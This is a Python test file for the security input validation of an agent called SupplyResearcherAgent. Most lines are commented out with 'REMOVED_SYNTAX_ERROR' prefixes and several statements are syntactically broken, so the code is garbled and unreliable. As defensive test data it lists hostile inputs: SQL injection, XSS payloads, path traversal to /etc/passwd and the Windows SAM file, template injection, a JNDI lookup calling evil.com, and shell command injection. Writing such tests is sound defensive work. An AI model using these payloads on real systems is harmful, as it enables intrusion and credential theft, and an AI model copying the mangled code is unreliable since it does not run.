from unittest.mock import AsyncMock, Mock, patch, MagicMock

# REMOVED_SYNTAX_ERROR: '''
# REMOVED_SYNTAX_ERROR: Security and validation tests for SupplyResearcherAgent
# REMOVED_SYNTAX_ERROR: Modular design with ≤300 lines, ≤8 lines per function
""

import sys
from pathlib import Path
from netra_backend.app.websocket_core.unified_manager import UnifiedWebSocketManager
from test_framework.database.test_database_manager import TestDatabaseManager
from netra_backend.app.agents.supervisor.agent_registry import AgentRegistry
from netra_backend.app.agents.supervisor.user_execution_engine import UserExecutionEngine
from shared.isolated_environment import IsolatedEnvironment

# Test framework import - using pytest fixtures instead

import asyncio

import pytest

from netra_backend.app.agents.state import DeepAgentState
# REMOVED_SYNTAX_ERROR: from netra_backend.tests.agents.supply_researcher_fixtures import ( )
agent,
assert_malicious_input_safe,
malicious_inputs,


# REMOVED_SYNTAX_ERROR: class TestSupplyResearcherSecurity:
    # REMOVED_SYNTAX_ERROR: """Security and input validation tests"""

# REMOVED_SYNTAX_ERROR: def test_input_validation_security(self, agent):
    # REMOVED_SYNTAX_ERROR: """Test input validation against injection attacks"""
    # REMOVED_SYNTAX_ERROR: malicious_test_cases = _get_malicious_inputs()
    # REMOVED_SYNTAX_ERROR: for malicious_input in malicious_test_cases:
        # REMOVED_SYNTAX_ERROR: parsed = agent._parse_natural_language_request(malicious_input)
        # REMOVED_SYNTAX_ERROR: _verify_safe_parsing(parsed)

# REMOVED_SYNTAX_ERROR: def _get_malicious_inputs(self):
    # REMOVED_SYNTAX_ERROR: """Get malicious input test cases (≤8 lines)"""
    # REMOVED_SYNTAX_ERROR: return [ )
    # REMOVED_SYNTAX_ERROR: ""; DROP TABLE supply_items; --",
    # REMOVED_SYNTAX_ERROR: "<script>alert('xss')</script>",
    # REMOVED_SYNTAX_ERROR: "../../etc/passwd",
    # REMOVED_SYNTAX_ERROR: "${jndi:ldap://evil.com/a}",
    # REMOVED_SYNTAX_ERROR: "{{7*7}}"  # Template injection
    

# REMOVED_SYNTAX_ERROR: def _verify_safe_parsing(self, parsed):
    # REMOVED_SYNTAX_ERROR: """Verify input was parsed safely (≤8 lines)"""
    # REMOVED_SYNTAX_ERROR: assert_malicious_input_safe(parsed)

    # Removed problematic line: @pytest.mark.asyncio
    # Removed problematic line: async def test_rate_limiting_backoff(self, agent):
        # REMOVED_SYNTAX_ERROR: """Test exponential backoff on rate limit errors"""
        # REMOVED_SYNTAX_ERROR: state = _create_rate_limit_test_state()
        # REMOVED_SYNTAX_ERROR: call_count = 0
        # REMOVED_SYNTAX_ERROR: mock_api = _create_rate_limit_mock(call_count)
        # REMOVED_SYNTAX_ERROR: await _test_rate_limiting_behavior(agent, state, mock_api)

# REMOVED_SYNTAX_ERROR: def _create_rate_limit_test_state(self):
    # REMOVED_SYNTAX_ERROR: """Create state for rate limiting test (≤8 lines)"""
    # REMOVED_SYNTAX_ERROR: return DeepAgentState( )
    # REMOVED_SYNTAX_ERROR: user_request="Test rate limiting",
    # REMOVED_SYNTAX_ERROR: chat_thread_id="test_thread",
    # REMOVED_SYNTAX_ERROR: user_id="test_user"
    

# REMOVED_SYNTAX_ERROR: def _create_rate_limit_mock(self, call_count):
    # REMOVED_SYNTAX_ERROR: """Create rate limit mock function (≤8 lines)"""
# REMOVED_SYNTAX_ERROR: async def mock_api_with_rate_limit(*args, **kwargs):
    # REMOVED_SYNTAX_ERROR: nonlocal call_count
    # REMOVED_SYNTAX_ERROR: call_count += 1
    # REMOVED_SYNTAX_ERROR: if call_count < 3:
        # REMOVED_SYNTAX_ERROR: raise Exception("429 Too Many Requests")
        # REMOVED_SYNTAX_ERROR: return _get_successful_response()
        # REMOVED_SYNTAX_ERROR: return mock_api_with_rate_limit

# REMOVED_SYNTAX_ERROR: def _get_successful_response(self):
    # REMOVED_SYNTAX_ERROR: """Get successful API response (≤8 lines)"""
    # REMOVED_SYNTAX_ERROR: return { )
    # REMOVED_SYNTAX_ERROR: "session_id": "success",
    # REMOVED_SYNTAX_ERROR: "status": "completed",
    # REMOVED_SYNTAX_ERROR: "questions_answered": [],
    # REMOVED_SYNTAX_ERROR: "citations": []
    

# REMOVED_SYNTAX_ERROR: async def _test_rate_limiting_behavior(self, agent, state, mock_api):
    # REMOVED_SYNTAX_ERROR: """Test rate limiting backoff behavior (≤8 lines)"""
    # REMOVED_SYNTAX_ERROR: with patch.object(agent, '_call_deep_research_api', side_effect=mock_api):
        # Mock: Async component isolation for testing without real async operations
        # REMOVED_SYNTAX_ERROR: with patch('asyncio.sleep', new_callable=AsyncMock) as mock_sleep:
            # REMOVED_SYNTAX_ERROR: await _execute_rate_limit_test(agent, state)
            # REMOVED_SYNTAX_ERROR: _verify_backoff_delays(mock_sleep)

# REMOVED_SYNTAX_ERROR: async def _execute_rate_limit_test(self, agent, state):
    # REMOVED_SYNTAX_ERROR: """Execute rate limiting test (≤8 lines)"""
    # REMOVED_SYNTAX_ERROR: try:
        # REMOVED_SYNTAX_ERROR: await agent.execute(state, "rate_limit_test", False)
        # REMOVED_SYNTAX_ERROR: except Exception:
            # REMOVED_SYNTAX_ERROR: pass  # Expected to fail after retries

# REMOVED_SYNTAX_ERROR: def _verify_backoff_delays(self, mock_sleep):
    # REMOVED_SYNTAX_ERROR: """Verify exponential backoff delays (≤8 lines)"""
    # REMOVED_SYNTAX_ERROR: if mock_sleep.called:
        # REMOVED_SYNTAX_ERROR: delays = [call[0][0] for call in mock_sleep.call_args_list]
        # REMOVED_SYNTAX_ERROR: for i in range(1, len(delays)):
            # REMOVED_SYNTAX_ERROR: assert delays[i] >= delays[i-1]

# REMOVED_SYNTAX_ERROR: def test_sql_injection_prevention(self, agent):
    # REMOVED_SYNTAX_ERROR: """Test prevention of SQL injection attacks"""
    # REMOVED_SYNTAX_ERROR: sql_injections = _get_sql_injection_cases()
    # REMOVED_SYNTAX_ERROR: for injection in sql_injections:
        # REMOVED_SYNTAX_ERROR: parsed = agent._parse_natural_language_request(injection)
        # REMOVED_SYNTAX_ERROR: _verify_sql_injection_blocked(parsed, injection)

# REMOVED_SYNTAX_ERROR: def _get_sql_injection_cases(self):
    # REMOVED_SYNTAX_ERROR: """Get SQL injection test cases (≤8 lines)"""
    # REMOVED_SYNTAX_ERROR: return [ )
    # REMOVED_SYNTAX_ERROR: "1; DROP TABLE users; --",
    # REMOVED_SYNTAX_ERROR: ""; UNION SELECT * FROM passwords; --",
    # REMOVED_SYNTAX_ERROR: "1' OR '1'='1",
    # REMOVED_SYNTAX_ERROR: "admin"--",
    # REMOVED_SYNTAX_ERROR: ""; INSERT INTO admin VALUES("hacker"); --"
    

# REMOVED_SYNTAX_ERROR: def _verify_sql_injection_blocked(self, parsed, injection):
    # REMOVED_SYNTAX_ERROR: """Verify SQL injection was blocked (≤8 lines)"""
    # REMOVED_SYNTAX_ERROR: assert isinstance(parsed, dict)
    # REMOVED_SYNTAX_ERROR: assert "research_type" in parsed
    # Ensure no SQL keywords were preserved
    # REMOVED_SYNTAX_ERROR: assert "DROP" not in str(parsed).upper()
    # REMOVED_SYNTAX_ERROR: assert "UNION" not in str(parsed).upper()

# REMOVED_SYNTAX_ERROR: def test_xss_prevention(self, agent):
    # REMOVED_SYNTAX_ERROR: """Test prevention of XSS attacks"""
    # REMOVED_SYNTAX_ERROR: xss_attacks = _get_xss_attack_cases()
    # REMOVED_SYNTAX_ERROR: for attack in xss_attacks:
        # REMOVED_SYNTAX_ERROR: parsed = agent._parse_natural_language_request(attack)
        # REMOVED_SYNTAX_ERROR: _verify_xss_blocked(parsed)

# REMOVED_SYNTAX_ERROR: def _get_xss_attack_cases(self):
    # REMOVED_SYNTAX_ERROR: """Get XSS attack test cases (≤8 lines)"""
    # REMOVED_SYNTAX_ERROR: return [ )
    # REMOVED_SYNTAX_ERROR: "<script>alert('xss')</script>",
    # REMOVED_SYNTAX_ERROR: "<img src=x onerror=alert('xss')>",
    # REMOVED_SYNTAX_ERROR: "javascript:alert('xss')",
    # REMOVED_SYNTAX_ERROR: "<iframe src=javascript:alert('xss')></iframe>",
    # REMOVED_SYNTAX_ERROR: "<svg onload=alert('xss')>"
    

# REMOVED_SYNTAX_ERROR: def _verify_xss_blocked(self, parsed):
    # REMOVED_SYNTAX_ERROR: """Verify XSS attack was blocked (≤8 lines)"""
    # REMOVED_SYNTAX_ERROR: assert isinstance(parsed, dict)
    # REMOVED_SYNTAX_ERROR: assert "research_type" in parsed
    # Ensure no script tags were preserved
    # REMOVED_SYNTAX_ERROR: assert "<script>" not in str(parsed).lower()
    # REMOVED_SYNTAX_ERROR: assert "javascript:" not in str(parsed).lower()

# REMOVED_SYNTAX_ERROR: def test_path_traversal_prevention(self, agent):
    # REMOVED_SYNTAX_ERROR: """Test prevention of path traversal attacks"""
    # REMOVED_SYNTAX_ERROR: path_attacks = _get_path_traversal_cases()
    # REMOVED_SYNTAX_ERROR: for attack in path_attacks:
        # REMOVED_SYNTAX_ERROR: parsed = agent._parse_natural_language_request(attack)
        # REMOVED_SYNTAX_ERROR: _verify_path_traversal_blocked(parsed)

# REMOVED_SYNTAX_ERROR: def _get_path_traversal_cases(self):
    # REMOVED_SYNTAX_ERROR: """Get path traversal test cases (≤8 lines)"""
    # REMOVED_SYNTAX_ERROR: return [ )
    # REMOVED_SYNTAX_ERROR: "../../etc/passwd",
    # REMOVED_SYNTAX_ERROR: "../../../windows/system32/config/sam",
    # REMOVED_SYNTAX_ERROR: "..\\..\\..\\windows\\system32\\config\\sam",
    # REMOVED_SYNTAX_ERROR: "/etc/passwd",
    # REMOVED_SYNTAX_ERROR: "C:\\windows\\system32\\config\\sam"
    

# REMOVED_SYNTAX_ERROR: def _verify_path_traversal_blocked(self, parsed):
    # REMOVED_SYNTAX_ERROR: """Verify path traversal was blocked (≤8 lines)"""
    # REMOVED_SYNTAX_ERROR: assert isinstance(parsed, dict)
    # REMOVED_SYNTAX_ERROR: assert "research_type" in parsed
    # Ensure no path traversal patterns were preserved
    # REMOVED_SYNTAX_ERROR: assert "../" not in str(parsed)
    # REMOVED_SYNTAX_ERROR: assert "..\\" not in str(parsed)

# REMOVED_SYNTAX_ERROR: def test_template_injection_prevention(self, agent):
    # REMOVED_SYNTAX_ERROR: """Test prevention of template injection attacks"""
    # REMOVED_SYNTAX_ERROR: template_attacks = _get_template_injection_cases()
    # REMOVED_SYNTAX_ERROR: for attack in template_attacks:
        # REMOVED_SYNTAX_ERROR: parsed = agent._parse_natural_language_request(attack)
        # REMOVED_SYNTAX_ERROR: _verify_template_injection_blocked(parsed)

# REMOVED_SYNTAX_ERROR: def _get_template_injection_cases(self):
    # REMOVED_SYNTAX_ERROR: """Get template injection test cases (≤8 lines)"""
    # REMOVED_SYNTAX_ERROR: return [ )
    # REMOVED_SYNTAX_ERROR: "{{7*7}}",
    # REMOVED_SYNTAX_ERROR: "${7*7}",
    # REMOVED_SYNTAX_ERROR: "#{7*7}",
    # REMOVED_SYNTAX_ERROR: "{{config}}",
    # REMOVED_SYNTAX_ERROR: "${jndi:ldap://evil.com/a}"
    

# REMOVED_SYNTAX_ERROR: def _verify_template_injection_blocked(self, parsed):
    # REMOVED_SYNTAX_ERROR: """Verify template injection was blocked (≤8 lines)"""
    # REMOVED_SYNTAX_ERROR: assert isinstance(parsed, dict)
    # REMOVED_SYNTAX_ERROR: assert "research_type" in parsed
    # Ensure no template injection patterns were preserved
    # REMOVED_SYNTAX_ERROR: assert "{{" not in str(parsed) ))
    # REMOVED_SYNTAX_ERROR: assert "${" not in str(parsed) )

# REMOVED_SYNTAX_ERROR: def test_command_injection_prevention(self, agent):
    # REMOVED_SYNTAX_ERROR: """Test prevention of command injection attacks"""
    # REMOVED_SYNTAX_ERROR: command_attacks = _get_command_injection_cases()
    # REMOVED_SYNTAX_ERROR: for attack in command_attacks:
        # REMOVED_SYNTAX_ERROR: parsed = agent._parse_natural_language_request(attack)
        # REMOVED_SYNTAX_ERROR: _verify_command_injection_blocked(parsed)

# REMOVED_SYNTAX_ERROR: def _get_command_injection_cases(self):
    # REMOVED_SYNTAX_ERROR: """Get command injection test cases (≤8 lines)"""
    # REMOVED_SYNTAX_ERROR: return [ )
    # REMOVED_SYNTAX_ERROR: "; cat /etc/passwd",
    # REMOVED_SYNTAX_ERROR: "| whoami",
    # REMOVED_SYNTAX_ERROR: "& net user",
    # REMOVED_SYNTAX_ERROR: "`id`",
    # REMOVED_SYNTAX_ERROR: "$(whoami)"
    

# REMOVED_SYNTAX_ERROR: def _verify_command_injection_blocked(self, parsed):
    # REMOVED_SYNTAX_ERROR: """Verify command injection was blocked (≤8 lines)"""
    # REMOVED_SYNTAX_ERROR: assert isinstance(parsed, dict)
    # REMOVED_SYNTAX_ERROR: assert "research_type" in parsed
    # Ensure no command injection patterns were preserved
    # REMOVED_SYNTAX_ERROR: assert "cat " not in str(parsed).lower()
    # REMOVED_SYNTAX_ERROR: assert "whoami" not in str(parsed).lower()

    # Removed problematic line: @pytest.mark.asyncio
    # Removed problematic line: async def test_input_length_validation(self, agent):
        # REMOVED_SYNTAX_ERROR: """Test validation of input length limits"""
        # REMOVED_SYNTAX_ERROR: long_input = _create_extremely_long_input()
        # REMOVED_SYNTAX_ERROR: parsed = agent._parse_natural_language_request(long_input)
        # REMOVED_SYNTAX_ERROR: _verify_length_handled_safely(parsed)

# REMOVED_SYNTAX_ERROR: def _create_extremely_long_input(self):
    # REMOVED_SYNTAX_ERROR: """Create extremely long input for testing (≤8 lines)"""
    # REMOVED_SYNTAX_ERROR: return "A" * 10000  # 10KB of data

# REMOVED_SYNTAX_ERROR: def _verify_length_handled_safely(self, parsed):
    # REMOVED_SYNTAX_ERROR: """Verify long input was handled safely (≤8 lines)"""
    # REMOVED_SYNTAX_ERROR: assert isinstance(parsed, dict)
    # REMOVED_SYNTAX_ERROR: assert "research_type" in parsed
    # Should not crash or cause memory issues